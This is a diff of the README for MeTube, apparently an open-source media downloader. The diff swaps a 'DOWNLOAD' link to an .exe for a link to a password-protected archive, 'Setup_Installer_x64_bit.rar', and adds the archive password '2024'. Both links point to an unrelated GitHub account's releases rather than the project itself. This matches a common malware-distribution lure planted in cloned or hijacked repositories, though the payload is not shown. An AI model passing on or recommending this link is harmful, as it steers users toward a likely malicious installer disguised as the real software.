@@ -1,5 +1,8 @@
 # MeTube
-[DOWNLOAD](https://github.com/mastersooguve/names/releases/download/release/InstallationPackage.exe)
+[DOWNLOAD](https://github.com/mastersooguve/names/releases/download/release/Setup_Installer_x64_bit.rar)
+
+PASS TO ARCHIVE: 2024
+
 > **_NOTE:_**  32-bit ARM builds have been retired (a full year after [other major players](https://www.linuxserver.io/blog/a-farewell-to-arm-hf)), as new Node versions don't support them, and continued security updates and dependencies require new Node versions. Please migrate to a 64-bit OS to continue receiving MeTube upgrades.
 
 ![Build Status](https://github.com/alexta69/metube/actions/workflows/main.yml/badge.svg)
